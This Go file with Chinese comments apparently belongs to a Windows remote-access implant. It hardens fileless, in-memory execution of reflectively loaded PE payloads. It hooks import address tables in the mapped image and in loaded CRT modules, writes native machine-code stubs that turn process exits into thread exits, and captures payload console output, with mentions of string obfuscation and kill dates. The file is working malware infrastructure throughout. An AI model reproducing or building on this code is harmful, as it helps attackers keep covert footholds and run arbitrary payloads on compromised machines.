//go:build windows

package main

import (
	"encoding/binary"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"
	"unicode/utf8"
	"unsafe"

	"golang.org/x/sys/windows"
)

// ─── 内存执行加固：退出拦截 + 输出捕获（v1.4.0 S6 P0-2）────────────────────────
//
// 要解决的问题：fileless-exec 的 exe_mem / dll 是**同进程**反射映射执行。被执行的
// 程序收尾时（main 返回 → CRT exit() → ExitProcess，或自己直接调 ExitProcess）
// 会把宿主植入端一起结束 —— 会话永久掉线，而服务端只看到"目标机掉线了"。
//
// 两层接管（都在 IAT 层，**不做 inline hook**，理由见"已知不覆盖"）：
//
//	层 1：被映射镜像自己的导入表；
//	层 2：已加载模块的导入表（覆盖 msvcrt/ucrtbase 这些 CRT —— "main 返回"这条
//	      最常见的收尾路径走的正是**它们自己的 IAT**，只改镜像 IAT 拦不住）。
//
// 两类目标、两种实现（这是本文件最关键的设计决定，有实测依据）：
//
//	① 退出类（ExitProcess / RtlExitUserProcess / TerminateProcess / NtTerminateProcess）
//	   → **原生机器码桩**（arch 相关，运行期在可执行页里生成）。
//	   为什么不用 Go 回调：实测（app 内 trace + 隔离实验）"在 Go 回调里调 ExitThread"
//	   会结束一条 Go runtime 已经接管的线程，进程随后消失（任务结果永远不回执）。
//	   纯 C 对照实验（.tmp-verify/s6hook/cbridge）证明：同样的 ExitThread 从**原生桩**
//	   里调完全安全（进程存活、退出码正确）。桩做的事只有三件：记录退出码/命中来源、
//	   自增命中计数、调 ExitThread(退出码) —— 全部是纯机器码，不进 Go runtime。
//	② 输出类（WriteFile / WriteConsoleA / WriteConsoleW）
//	   → **Go 回调**（这类回调只复制字节后正常返回，是仓库里既有成熟用法，
//	     BOF 的 BeaconPrintf 回调就是这么做的）。不能用管道 + SetStdHandle：
//	     CRT 的 std 句柄表在 **DLL 加载时**就读走了，而 msvcrt 恰好是被反射映射的
//	     镜像在解析导入表时加载的 —— 等我们设管道时它早已缓存了旧句柄（实测输出
//	     仍然落到宿主原有 std 句柄上）。按句柄在 WriteFile 这一层截流没有这个时序问题。
//
// 为什么宿主自己的正常收尾**结构性地**不受影响（本改动最容易做错的地方）：
//
//   - 层 2 刻意**跳过** ntdll.dll / kernel32.dll / kernelbase.dll 与宿主主镜像。
//     宿主的收尾是 os.Exit/主循环返回 → Go runtime 用**直接地址**调
//     kernel32!ExitProcess（不经过任何 IAT）→ kernelbase!ExitProcess 内部再用
//     **kernelbase 自己的 IAT** 调 RtlExitUserProcess。这三处一个都没改，
//     所以宿主的 exit 任务 / kill date 自杀 / os.Exit 路径上根本不会进到我们的桩。
//   - 被改的槽只有两类消费者：被映射镜像自己的代码、以及载荷带进来的 CRT/第三方 DLL。
//     宿主（Go 植入端，CGO_ENABLED=0）不通过 msvcrt 写控制台、也不通过它退出。
//
// 已知不覆盖（如实写，别把它当万能）：
//   - 载荷用 GetProcAddress/LdrGetProcedureAddress **运行时解析**出 ExitProcess /
//     RtlExitUserProcess 的地址再直接调：普通间接调用，不经过任何被改的 IAT；
//   - 载荷把退出调用静态链接/内联进自己的代码（非 IAT 间接调用）同理不覆盖；
//   - `TerminateProcess(<本进程的真实句柄>)` / `NtTerminateProcess(<真实句柄>)`：
//     原生桩只能比较常量伪句柄（GetCurrentProcess() == -1），真实句柄判不出来 →
//     放行（**明确不覆盖**；只有 GetCurrentProcess() 这种写法在覆盖范围内）；
//   - `WriteFileEx` / `NtWriteFile` / 自己 CreateFile("CONOUT$") 再写的输出不捕获；
//   - 不做 inline hook 的理由：需要搬运被覆盖函数的序言（可能含 rip 相对寻址/短跳转），
//     失败模式是"被 hook 的 API 全进程变砖"，对宿主可用性的风险远大于收益。
//     ROADMAP 里写的"inline hook 双保险"因此**未做**（如实记录；IAT 双层的实际覆盖
//     范围见 CHANGELOG 的实测结论）。
//
// 排障开关（默认不生效，只做一次 Getenv 判断）：
//   TOSHELL_GUARD_TRACE=1 或 =<路径>  把守卫的关键步骤写进跟踪文件（默认 %TEMP%\toshell-guard.log）

// guardTraceEnv 见文件头的排障开关说明（写成 var 而不是 const：构建期字符串混淆
// 按行处理字面量，const 行会被跳过，名字就明文留在载荷里了）。
var guardTraceEnv = "TOSHELL_GUARD_TRACE"

// guardImage 一个已登记（反射映射进来的）镜像区间。
type guardImage struct {
	base uintptr
	size uintptr
	kind string
}

// guardExitEvent 最近一次"被拦截的退出"的现场（数据来自原生桩写的那几个槽）。
type guardExitEvent struct {
	code  int32
	via   string
	tid   uint32
	image uintptr
	at    time.Time
}

var (
	guardMu     sync.Mutex
	guardImages []guardImage
	// guardSlots 记录我们改过的 IAT 槽 → 原值（幂等 + 计数）。
	guardSlots map[uintptr]uintptr

	// guardExecTid 最近一次内存执行的执行线程 id（仅用于回显/排障）。
	guardExecTid uint32

	guardInstallOnce sync.Once
	guardInstalled   bool

	// 原生桩：代码页（RX）与数据槽页（RW）。槽布局见 guardStubSlot* 常量。
	guardStubCode uintptr
	guardStubData uintptr

	// 四个退出类桩的入口地址。
	stubExitProcess uintptr
	stubRtlExit     uintptr
	stubTerminate   uintptr
	stubNtTerminate uintptr

	// 输出类回调（Go 回调，只复制字节后返回）。
	cbWriteFile     uintptr
	cbWriteConsoleA uintptr
	cbWriteConsoleW uintptr

	// 退出类桩里的"记录回调"（Go 回调，只写状态后返回 —— 绝不在这里结束线程）。
	cbRecord uintptr

	guardStubHits int
	guardLastExit guardExitEvent
)

// 原生桩数据槽（都在 guardStubData 那一页里）。
const (
	guardStubSlotCode = 0 // uint32：最近一次被拦下的退出码
	guardStubSlotVia  = 4 // uint32：命中来源（见 guardVia* 常量）
	guardStubSlotHit  = 8 // uint32：累计命中次数
)

// 命中来源编码（写进 via 槽，供任务结果回显）。
const (
	guardViaExitProcess = 1
	guardViaRtlExit     = 2
	guardViaTerminate   = 3
	guardViaNtTerminate = 4
)

// ─── 跟踪（排障）────────────────────────────────────────────────────────────

var (
	guardTraceOnce sync.Once
	guardTraceOn   bool
	guardTraceMu   sync.Mutex
	guardTracePath string
)

// guardTrace 把一行守卫诊断写进跟踪文件（未开启时是空操作）。
func guardTrace(format string, args ...interface{}) {
	guardTraceOnce.Do(func() {
		v := strings.TrimSpace(os.Getenv(guardTraceEnv))
		if v == "" {
			return
		}
		guardTracePath = v
		if v == "1" || strings.EqualFold(v, "true") {
			guardTracePath = filepath.Join(os.TempDir(), "toshell-guard.log")
		}
		guardTraceOn = true
		// 看门狗：每 2 秒写一行"我还活着"。用途是把"任务结果没回执"分成两种
		// 完全不同的情况 —— 看门狗也停了 = 进程没了；看门狗还在写 = 进程活着但卡住了。
		go func() {
			for {
				time.Sleep(2 * time.Second)
				guardTraceRaw("看门狗: 进程仍存活（若此后不再有行，说明进程在这一刻消失）")
			}
		}()
	})
	if !guardTraceOn {
		return
	}
	guardTraceRaw(fmt.Sprintf("%s [tid=%d] %s", time.Now().Format("15:04:05.000"), guardCurrentThreadID(), fmt.Sprintf(format, args...)))
}

// guardTraceRaw 直接落盘一行（已含时间/线程前缀）。
func guardTraceRaw(line string) {
	guardTraceMu.Lock()
	defer guardTraceMu.Unlock()
	f, err := os.OpenFile(guardTracePath, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0o600)
	if err != nil {
		return
	}
	defer f.Close()
	_, _ = f.WriteString(line + "\n")
}

// ─── 镜像登记 ───────────────────────────────────────────────────────────────

// guardRegisterImage 登记一个反射映射进来的镜像区间（由 mapImagePE 统一调用，
// 因此 exe_mem / dll / exec_module 三条路径都自动登记）。
func guardRegisterImage(base uintptr, size uintptr, kind string) {
	if base == 0 || size == 0 {
		return
	}
	guardMu.Lock()
	guardImages = append(guardImages, guardImage{base: base, size: size, kind: kind})
	guardMu.Unlock()
}

// guardUnregisterImage 注销镜像区间（由 freeMem 统一调用：exec_module 执行完会
// VirtualFree 掉镜像，登记表必须同步）。
func guardUnregisterImage(base uintptr) {
	if base == 0 {
		return
	}
	guardMu.Lock()
	for i := range guardImages {
		if guardImages[i].base == base {
			guardImages = append(guardImages[:i], guardImages[i+1:]...)
			break
		}
	}
	guardMu.Unlock()
}

// guardMarkExecThread 记录"本次内存执行的执行线程 id"（只用于排障回显：
// 拦截范围的判定是**结构性**的 —— 见文件头"为什么宿主自己的正常收尾不受影响"：
// 被改的 IAT 槽只有被映射镜像与载荷带进来的 CRT/第三方 DLL 会走）。
func guardMarkExecThread(tid uint32) {
	if tid == 0 {
		return
	}
	guardMu.Lock()
	guardExecTid = tid
	guardMu.Unlock()
}

// ─── 原生桩：生成"退出类"接管代码 ──────────────────────────────────────────
//
// 桩的职责固定：写数据槽（退出码/来源/命中计数）→ 调记录回调（Go，只记录后返回）
// → **原生调用 ExitThread(退出码)**。TerminateProcess / NtTerminateProcess 版本
// 额外带一个"只认 GetCurrentProcess()（-1）"的判断，不是本进程就跳回原函数。
//
// 为什么改写退出必须是原生调用（而不是在 Go 回调里调 ExitThread）：
// 见文件头与 CHANGELOG 的实测记录 —— 从 Go 回调里结束线程会把宿主一起带走。

var (
	guardStubBuildErr error
	guardCodeOff      int
)

// guardBuildStubs 生成四个桩，返回四个入口地址。
//
// 桩的调用序列（386 版，amd64 同构）：
//
//	记录：call <cbRecord>(code)   ← Go 回调，只写状态后正常返回（安全：这类回调不结束线程）
//	改写：call <ExitThread>(code) ← 原生调用，**不进 Go runtime**（安全：实测过的唯一安全做法）
//	int3                          ← 永不返回；回到这里说明 ExitThread 失败
func guardBuildStubs() (uintptr, uintptr, uintptr, uintptr, error) {
	exitThread := resolveAPI("kernel32.dll", "ExitThread").resolved()
	if exitThread == 0 {
		return 0, 0, 0, 0, fmt.Errorf("ExitThread 解析失败（无法改写退出）")
	}
	if cbRecord == 0 {
		return 0, 0, 0, 0, fmt.Errorf("记录回调未创建")
	}
	// 数据槽页（RW，不进代码页）：退出码/来源/命中计数（给 Go 侧读的旁证）
	data, _, err := allocRW(4096)
	if err != nil {
		return 0, 0, 0, 0, fmt.Errorf("分配桩数据页失败: %w", err)
	}
	guardStubData = data
	// 代码页：先 RW 写机器码，写完立刻收紧为 RX（与包内其它路径同一纪律，绝不留 RWX）
	code, _, err := allocRW(4096)
	if err != nil {
		return 0, 0, 0, 0, fmt.Errorf("分配桩代码页失败: %w", err)
	}
	guardStubCode = code
	guardCodeOff = 0

	exitStub := func(via uint32) uintptr {
		at := guardStubCode + uintptr(guardCodeOff)
		if runtime.GOARCH == "amd64" || runtime.GOARCH == "arm64" {
			guardEmit64Exit(exitThread, via)
		} else {
			guardEmit32Exit(exitThread, via)
		}
		return at
	}
	termStub := func(via uint32, orig uintptr) uintptr {
		at := guardStubCode + uintptr(guardCodeOff)
		if runtime.GOARCH == "amd64" || runtime.GOARCH == "arm64" {
			guardEmit64Terminate(exitThread, via, orig)
		} else {
			guardEmit32Terminate(exitThread, via, orig)
		}
		return at
	}

	stubExitProcess = exitStub(guardViaExitProcess)
	stubRtlExit = exitStub(guardViaRtlExit)
	stubTerminate = termStub(guardViaTerminate, resolveAPI("kernel32.dll", "TerminateProcess").resolved())
	stubNtTerminate = termStub(guardViaNtTerminate, resolveAPI("ntdll.dll", "NtTerminateProcess").resolved())

	if err := protectRX(guardStubCode, 4096); err != nil {
		return 0, 0, 0, 0, fmt.Errorf("收紧桩代码页为 RX 失败: %w", err)
	}
	if stubExitProcess == 0 || stubTerminate == 0 {
		return 0, 0, 0, 0, fmt.Errorf("桩生成失败")
	}
	return stubExitProcess, stubRtlExit, stubTerminate, stubNtTerminate, nil
}

// guardEmit 往桩代码页追加字节。
func guardEmit(b ...byte) {
	for _, x := range b {
		*(*byte)(unsafe.Pointer(guardStubCode + uintptr(guardCodeOff))) = x
		guardCodeOff++
	}
}

func guardEmitU32(v uint32) {
	guardEmit(byte(v), byte(v>>8), byte(v>>16), byte(v>>24))
}

func guardEmitU64(v uint64) {
	guardEmitU32(uint32(v))
	guardEmitU32(uint32(v >> 32))
}

// guardEmit32Exit 生成 386 版"退出类"桩：
//
//	mov eax, [esp+4]                 ; exitCode（stdcall 第一个参数）
//	mov [codeSlot], eax              ; 顺带记在数据槽（旁证）
//	push eax; mov eax, <cbRecord>; call eax   ; Go 回调只记录后正常返回
//	mov eax, [esp+4]                 ; 重新取退出码（stdcall 回调已清掉自己那个参数）
//	push eax; mov eax, <ExitThread>; call eax ; **原生调用 ExitThread**（不进 Go runtime）
//	int3                             ; 永不返回；回到这里说明 ExitThread 失败了
func guardEmit32Exit(exitThread uintptr, via uint32) {
	guardEmit(0x8B, 0x44, 0x24, 0x04) // mov eax, [esp+4]
	guardEmit(0xA3)                   // mov [codeSlot], eax
	guardEmitU32(uint32(guardStubData + guardStubSlotCode))
	guardEmit(0xC7, 0x05) // mov dword [viaSlot], via
	guardEmitU32(uint32(guardStubData + guardStubSlotVia))
	guardEmitU32(via)
	guardEmit(0xFF, 0x05) // inc dword [hitSlot]
	guardEmitU32(uint32(guardStubData + guardStubSlotHit))
	if cbRecord != 0 {
		guardEmit(0x50) // push eax
		guardEmit(0xB8) // mov eax, cbRecord
		guardEmitU32(uint32(cbRecord))
		guardEmit(0xFF, 0xD0) // call eax（Go 回调只记录后返回）
	}
	guardEmit(0x8B, 0x44, 0x24, 0x04) // mov eax, [esp+4]（统一重取，回调会改 eax）
	guardEmit(0x50)
	guardEmit(0xB8)
	guardEmitU32(uint32(exitThread))
	guardEmit(0xFF, 0xD0)
	guardEmit(0xCC)
}

// guardEmit32Terminate 生成 386 版"终止类"桩（TerminateProcess / NtTerminateProcess）：
//
//	cmp dword [esp+4], -1            ; hProcess == GetCurrentProcess()（常量伪句柄）？
//	jne passthrough                  ; 不是本进程 → 原样交还原函数（绝不改变宿主功能）
//	...（同 exit 桩：记录 + ExitThread）...
//	int3
//	passthrough: mov eax, <orig>; jmp eax
func guardEmit32Terminate(exitThread uintptr, via uint32, orig uintptr) {
	guardEmit(0x83, 0x7C, 0x24, 0x04, 0xFF) // cmp dword [esp+4], -1
	jneAt := guardCodeOff
	guardEmit(0x75, 0x00) // jne rel8（回填）
	guardEmit(0x8B, 0x44, 0x24, 0x08)
	guardEmit(0xA3)
	guardEmitU32(uint32(guardStubData + guardStubSlotCode))
	guardEmit(0xC7, 0x05)
	guardEmitU32(uint32(guardStubData + guardStubSlotVia))
	guardEmitU32(via)
	guardEmit(0xFF, 0x05)
	guardEmitU32(uint32(guardStubData + guardStubSlotHit))
	if cbRecord != 0 {
		guardEmit(0x50)
		guardEmit(0xB8)
		guardEmitU32(uint32(cbRecord))
		guardEmit(0xFF, 0xD0)
	}
	guardEmit(0x8B, 0x44, 0x24, 0x08)
	guardEmit(0x50)
	guardEmit(0xB8)
	guardEmitU32(uint32(exitThread))
	guardEmit(0xFF, 0xD0)
	guardEmit(0xCC)
	target := guardCodeOff // passthrough 标签
	*(*byte)(unsafe.Pointer(guardStubCode + uintptr(jneAt+1))) = byte(target - (jneAt + 2))
	guardEmit(0xB8)
	guardEmitU32(uint32(orig))
	guardEmit(0xFF, 0xE0)
}

// guardEmit64Exit 生成 amd64 版"退出类"桩（rcx = exitCode）。
func guardEmit64Exit(exitThread uintptr, via uint32) {
	guardEmit(0x48, 0x89, 0x0C, 0x25) // mov [codeSlot], rcx
	guardEmitU32(uint32(guardStubData + guardStubSlotCode))
	guardEmit(0xC7, 0x04, 0x25) // mov dword [viaSlot], via
	guardEmitU32(uint32(guardStubData + guardStubSlotVia))
	guardEmitU32(via)
	guardEmit(0xFF, 0x04, 0x25) // inc dword [hitSlot]
	guardEmitU32(uint32(guardStubData + guardStubSlotHit))
	if cbRecord != 0 {
		// 调 Go 回调前把栈对齐到 16 字节（x64 ABI：call 指令处 rsp 必须 16 对齐）
		guardEmit(0x48, 0x83, 0xEC, 0x08) // sub rsp, 8
		guardEmit(0x48, 0xB8)             // mov rax, cbRecord（rcx 已是退出码）
		guardEmitU64(uint64(cbRecord))
		guardEmit(0xFF, 0xD0)             // call rax
		guardEmit(0x48, 0x83, 0xC4, 0x08) // add rsp, 8
	}
	guardEmit(0x48, 0x8B, 0x0C, 0x25) // mov rcx, [codeSlot]
	guardEmitU32(uint32(guardStubData + guardStubSlotCode))
	guardEmit(0x48, 0xB8) // mov rax, exitThread
	guardEmitU64(uint64(exitThread))
	guardEmit(0xFF, 0xE0) // jmp rax
	guardEmit(0xCC)
}

// guardEmit64Terminate 生成 amd64 版"终止类"桩（rcx = hProcess，rdx = code）。
func guardEmit64Terminate(exitThread uintptr, via uint32, orig uintptr) {
	guardEmit(0x48, 0x83, 0xF9, 0xFF) // cmp rcx, -1
	jneAt := guardCodeOff
	guardEmit(0x75, 0x00)
	guardEmit(0x48, 0x89, 0x14, 0x25)
	guardEmitU32(uint32(guardStubData + guardStubSlotCode))
	guardEmit(0xC7, 0x04, 0x25)
	guardEmitU32(uint32(guardStubData + guardStubSlotVia))
	guardEmitU32(via)
	guardEmit(0xFF, 0x04, 0x25)
	guardEmitU32(uint32(guardStubData + guardStubSlotHit))
	if cbRecord != 0 {
		guardEmit(0x48, 0x83, 0xEC, 0x08) // sub rsp, 8（对齐）
		guardEmit(0x48, 0xB8)             // mov rax, cbRecord（rcx=hProcess, rdx=code）
		guardEmitU64(uint64(cbRecord))
		guardEmit(0xFF, 0xD0)             // call rax
		guardEmit(0x48, 0x83, 0xC4, 0x08) // add rsp, 8
	}
	guardEmit(0x48, 0x89, 0xD1) // mov rcx, rdx（ExitThread 的参数 = 退出码）
	guardEmit(0x48, 0xB8)       // mov rax, exitThread
	guardEmitU64(uint64(exitThread))
	guardEmit(0xFF, 0xE0)
	guardEmit(0xCC)
	target := guardCodeOff
	*(*byte)(unsafe.Pointer(guardStubCode + uintptr(jneAt+1))) = byte(target - (jneAt + 2))
	guardEmit(0x48, 0xB8)
	guardEmitU64(uint64(orig))
	guardEmit(0xFF, 0xE0)
}

// ─── 装载：建桩 + 建输出回调 ────────────────────────────────────────────────

func guardInstall() bool {
	guardInstallOnce.Do(func() {
		defer func() {
			if r := recover(); r != nil {
				guardInstalled = false
				guardTrace("guardInstall: PANIC %v", r)
			}
			guardTrace("guardInstall: installed=%v exit=%#x rtl=%#x term=%#x ntterm=%#x writefile=%#x",
				guardInstalled, stubExitProcess, stubRtlExit, stubTerminate, stubNtTerminate, cbWriteFile)
		}()
		guardSlots = map[uintptr]uintptr{}
		// 退出类：先建"记录回调"（Go 回调，只写状态后正常返回 —— 不结束线程，安全）
		cbRecord = windows.NewCallback(guardHandleStubRecord)
		// 输出类：Go 回调（只复制字节后正常返回）
		cbWriteFile = windows.NewCallback(guardHandleWriteFile)
		cbWriteConsoleA = windows.NewCallback(guardHandleWriteConsoleA)
		cbWriteConsoleW = windows.NewCallback(guardHandleWriteConsoleW)
		// 退出类：原生桩（内部会 call cbRecord，然后原生调 ExitThread）
		a, b, c, d, err := guardBuildStubs()
		if err != nil {
			guardStubBuildErr = err
			guardTrace("guardInstall: 桩生成失败: %v", err)
		}
		stubExitProcess, stubRtlExit, stubTerminate, stubNtTerminate = a, b, c, d
		guardInstalled = cbWriteFile != 0 && cbWriteConsoleA != 0 && cbWriteConsoleW != 0 && stubExitProcess != 0
	})
	return guardInstalled
}

// guardArmImage 武装本次内存执行：装桩/回调、改镜像 IAT（层 1）、改已加载模块 IAT（层 2）。
// 返回（镜像内改了几处, 已加载模块里改了几处）。失败不阻断执行 —— 载荷至少还能跑，
// 只是加固不完整；调用方会把计数写进任务结果，出问题时看得见。
func guardArmImage(base uintptr, info *memPE, kind string) (int, int) {
	if !guardInstall() {
		guardTrace("guardArmImage: 未安装（%v），退出拦截/输出捕获**未生效**（kind=%s）", guardStubBuildErr, kind)
		return 0, 0
	}
	is64 := runtime.GOARCH == "amd64" || runtime.GOARCH == "arm64"
	size := uintptr(0)
	if info != nil {
		is64 = info.is64
		size = uintptr(info.sizeOfImage)
	}
	imageHits := guardPatchImports(base, size, is64)
	moduleHits := guardPatchLoadedModules()
	guardTrace("guardArmImage: kind=%s base=%#x size=%d 镜像IAT改=%d 模块IAT改=%d",
		kind, base, size, imageHits, moduleHits)
	return imageHits, moduleHits
}

// guardCallbackFor 把导入名映射到接管目标（退出类给原生桩，输出类给 Go 回调）。
// 名字比较用的是运行时值（构建期这些字面量会被字符串混淆成 xd("...")，二进制不留明文）。
func guardCallbackFor(name string) uintptr {
	switch name {
	case "ExitProcess":
		return stubExitProcess
	case "RtlExitUserProcess":
		return stubRtlExit
	case "TerminateProcess":
		return stubTerminate
	case "NtTerminateProcess":
		return stubNtTerminate
	case "WriteFile":
		return cbWriteFile
	case "WriteConsoleA":
		return cbWriteConsoleA
	case "WriteConsoleW":
		return cbWriteConsoleW
	}
	return 0
}

// guardPatchImports 改一个模块（或反射映射镜像）导入表里的目标槽，返回改了几处。
// size 是该模块/镜像的映像大小，用于给导入表的所有 RVA 做范围校验。
func guardPatchImports(base, size uintptr, is64 bool) int {
	if base == 0 || size == 0 {
		return 0
	}
	hits := 0
	guardMu.Lock()
	defer guardMu.Unlock()
	guardWalkImports(base, size, is64, func(name string, slot uintptr, current uintptr) {
		cb := guardCallbackFor(name)
		if cb == 0 {
			return
		}
		if guardPatchSlotLocked(slot, cb) {
			hits++
			guardTrace("  IAT 接管: %s slot=%#x orig=%#x cb=%#x", name, slot, current, cb)
		}
	})
	return hits
}

// guardPatchLoadedModules 遍历当前已加载模块，改掉它们的同名导入槽（层 2）。
//
// 跳过三类：宿主主镜像（我们自己的代码不碰）、ntdll/kernel32/kernelbase
// （宿主自己的收尾路径要经过它们，一个字节都不能动）。
// 幂等：已经改过的槽记录在 guardSlots 里，重复遍历不会重复计数。
func guardPatchLoadedModules() int {
	mainBase := guardMainImageBase()
	hits := 0
	for _, m := range guardEnumerateModules() {
		if m.base == 0 || m.base == mainBase {
			continue
		}
		switch strings.ToLower(m.name) {
		case "ntdll.dll", "kernel32.dll", "kernelbase.dll":
			// 宿主收尾路径（Go runtime → kernel32!ExitProcess → kernelbase 内部 IAT）
			// 的必经之处：绝不动。这就是"宿主正常退出仍然有效"的结构性保证。
			guardTrace("模块跳过（宿主关键路径）: %s", m.name)
			continue
		}
		guardTrace("模块扫描: %s base=%#x size=%d", m.name, m.base, m.size)
		hits += guardPatchImports(m.base, m.size, runtime.GOARCH == "amd64" || runtime.GOARCH == "arm64")
	}
	return hits
}

// guardPatchSlotLocked 把 IAT 槽改写成接管目标地址（调用方须已持有 guardMu）。
// 返回 true 表示本次真的改了（用于计数）。写之前把所在页临时改成 RW，
// 写完立刻还原原保护 —— 与包内其它"改几字节"的路径同一纪律，绝不留 RWX。
func guardPatchSlotLocked(slot uintptr, cb uintptr) bool {
	if slot == 0 || cb == 0 {
		return false
	}
	if _, done := guardSlots[slot]; done {
		return false
	}
	cur := *(*uintptr)(unsafe.Pointer(slot))
	guardSlots[slot] = cur
	if cur == cb {
		return false
	}
	word := unsafe.Sizeof(uintptr(0))
	err := guardWithWritable(slot, word, func() {
		*(*uintptr)(unsafe.Pointer(slot)) = cb
	})
	if err != nil {
		delete(guardSlots, slot)
		return false
	}
	return true
}

// guardWithWritable 把 [addr, addr+size) 所在页临时改成 RW，执行 fn 后还原。
// 与 memprotect_windows.go 的 withWritable 的区别：这里**按页对齐**再改保护 ——
// IAT 槽可能落在页尾，只保护 4 字节会漏掉跨页的那部分。
func guardWithWritable(addr, size uintptr, fn func()) error {
	start := addr &^ 0xFFF
	end := (addr + size + 0xFFF) &^ 0xFFF
	if end <= start {
		end = start + 0x1000
	}
	old, err := protectRWGet(start, end-start)
	if err != nil {
		return err
	}
	fn()
	return restoreProtect(start, end-start, old)
}

// guardWalkImports 遍历一个已加载模块 / 已映射镜像的导入表，对每个导入项回调
// fn(导入名, IAT 槽绝对地址, 槽当前值)。导入名拿不到（按序号导入 / 无名字表）时 name 为空串。
//
// ⚠️ 范围校验是**必须**的：这一层是"保护宿主"的代码，绝不能自己制造访问违例。
// 没有校验时，遇到 OriginalFirstThunk=0 的模块会把 IAT 里**已解析的地址**当成
// "名字 RVA"去读 → 读到未映射地址 → 访问违例把宿主打死。现在：
//   - 每个描述符 / thunk / 名字 RVA 都先用 size 校验范围；
//   - OriginalFirstThunk=0 时**不读名字**（此时名字表不存在）。
func guardWalkImports(base, size uintptr, is64 bool, fn func(name string, slot uintptr, current uintptr)) {
	if base == 0 || size == 0 {
		return
	}
	rva := guardImportDirRVA(base)
	if rva == 0 || uintptr(rva)+20 > size {
		return
	}
	step := uint32(4)
	if is64 {
		step = 8
	}
	desc := base + uintptr(rva)
	for i := 0; i < 1024; i++ {
		if uintptr(desc-base)+20 > size {
			return
		}
		oftRVA := *(*uint32)(unsafe.Pointer(desc))
		nameRVA := *(*uint32)(unsafe.Pointer(desc + 12))
		firstThunkRVA := *(*uint32)(unsafe.Pointer(desc + 16))
		if oftRVA == 0 && nameRVA == 0 && firstThunkRVA == 0 {
			return
		}
		if firstThunkRVA == 0 || uintptr(firstThunkRVA)+uintptr(step) > size {
			return
		}
		namesFromOFT := oftRVA != 0 && uintptr(oftRVA)+uintptr(step) <= size
		lookupRVA := oftRVA
		if !namesFromOFT {
			lookupRVA = firstThunkRVA
		}
		lr, ir := lookupRVA, firstThunkRVA
		for j := 0; j < 65536; j++ {
			if uintptr(lr)+uintptr(step) > size || uintptr(ir)+uintptr(step) > size {
				break
			}
			thunk := readThunk(base, lr, is64)
			if thunk == 0 {
				break
			}
			name := ""
			if namesFromOFT && !guardIsOrdinalThunk(thunk, is64) {
				nameRVA := uint32(thunk & 0xFFFFFFFF)
				if uintptr(nameRVA)+3 <= size { // 2 字节 hint + 至少 1 字节名字
					name = guardCStringBounded(base, uintptr(nameRVA)+2, size)
				}
			}
			fn(name, base+uintptr(ir), uintptr(readThunk(base, ir, is64)))
			lr += step
			ir += step
		}
		desc += 20 // IMAGE_IMPORT_DESCRIPTOR 固定 20 字节
	}
}

// guardCStringBounded 读一个以 NUL 结尾的短字符串，**严格限定在 [rva, size) 内**，
// 最多 256 字节（导入名不会更长；读到硬上限也当结束，避免畸形表把遍历拖死）。
func guardCStringBounded(base, rva, size uintptr) string {
	if rva >= size {
		return ""
	}
	end := size
	if rva+256 < end {
		end = rva + 256
	}
	out := make([]byte, 0, 32)
	for off := rva; off < end; off++ {
		c := *(*byte)(unsafe.Pointer(base + off))
		if c == 0 {
			break
		}
		out = append(out, c)
	}
	return string(out)
}

// guardIsOrdinalThunk 判断 thunk 是不是"按序号导入"（最高位/最高位所在双字置位）。
func guardIsOrdinalThunk(thunk uint64, is64 bool) bool {
	if is64 {
		return thunk&0x8000000000000000 != 0
	}
	return thunk&0x80000000 != 0
}

// guardImportDirRVA 从 PE 头读导入表（数据目录 1）的 RVA。模块与映射镜像通用。
func guardImportDirRVA(base uintptr) uint32 {
	if base == 0 || *(*uint16)(unsafe.Pointer(base)) != 0x5A4D { // "MZ"
		return 0
	}
	e := *(*uint32)(unsafe.Pointer(base + 0x3C))
	nt := base + uintptr(e)
	if *(*uint32)(unsafe.Pointer(nt)) != 0x00004550 { // "PE\0\0"
		return 0
	}
	opt := nt + 4 + 20
	switch *(*uint16)(unsafe.Pointer(opt)) {
	case 0x10B: // PE32：DataDirectory 起点 +96，条目 1 → +8
		return *(*uint32)(unsafe.Pointer(opt + 96 + 8))
	case 0x20B: // PE32+：DataDirectory 起点 +112，条目 1 → +8
		return *(*uint32)(unsafe.Pointer(opt + 112 + 8))
	}
	return 0
}

// ─── 模块枚举 / 宿主主镜像 ─────────────────────────────────────────────────

// guardModuleInfo 已加载模块的名字/基址/镜像大小。
type guardModuleInfo struct {
	name string
	base uintptr
	size uintptr
}

// guardEnumerateModules 沿 PEB 的 InMemoryOrderModuleList 列出全部已加载模块。
// 复用 peb_windows.go 的 getPEB/结构体，不调用任何 API。
func guardEnumerateModules() []guardModuleInfo {
	pebPtr := getPEB()
	if pebPtr == 0 {
		return nil
	}
	p := (*peb)(unsafe.Pointer(pebPtr))
	if p.ldr == nil {
		return nil
	}
	head := &p.ldr.inMemoryOrderLinks
	linkOff := 2 * unsafe.Sizeof(uintptr(0)) // LDR_DATA_TABLE_ENTRY.inMemoryOrderLinks 的偏移
	var out []guardModuleInfo
	cur := head.flink
	for cur != nil && cur != head {
		entry := (*ldrDataTableEntry)(unsafe.Pointer(uintptr(unsafe.Pointer(cur)) - linkOff))
		if entry.dllBase != 0 {
			out = append(out, guardModuleInfo{
				name: readUnicodeString(entry.baseDllName),
				base: entry.dllBase,
				size: entry.sizeOfImage,
			})
		}
		cur = cur.flink
	}
	return out
}

// guardMainImageBase 取宿主主镜像基址（层 2 要排除它：那是我们自己的代码）。
func guardMainImageBase() uintptr {
	proc := resolveAPI("kernel32.dll", "GetModuleHandleA")
	if proc.resolved() == 0 {
		return 0
	}
	v, _, _ := proc.Call(0)
	return v
}

// guardCurrentThreadID 取当前线程 id（取不到返回 0）。
func guardCurrentThreadID() uint32 {
	proc := resolveAPI("kernel32.dll", "GetCurrentThreadId")
	if proc.resolved() == 0 {
		return 0
	}
	v, _, _ := proc.Call()
	return uint32(v)
}

// ─── 输出捕获：在 WriteFile / WriteConsole 这一层按句柄截流 ──────────────────
//
// 为什么不用管道 + SetStdHandle：CRT 的 std 句柄表在 **DLL 加载时**（DllMain → _ioinit）
// 就用 GetStdHandle 读走了，而 msvcrt/ucrtbase 恰好是被映射镜像在解析导入表时加载的
// —— 等我们设管道时它早已缓存旧句柄。实测：设完管道后载荷的 printf 仍然写到宿主
// 原有的 std 句柄上（trace 里能看到 setStd(true,true) 但输出落在宿主 stdout 文件里）。
// 按句柄在写入点截流没有这个时序问题，而且不引入任何进程级全局状态（SetStdHandle
// 会改整个进程的 std 句柄，wait_ms=0 的载荷还在后台跑时还会跟它抢句柄）。

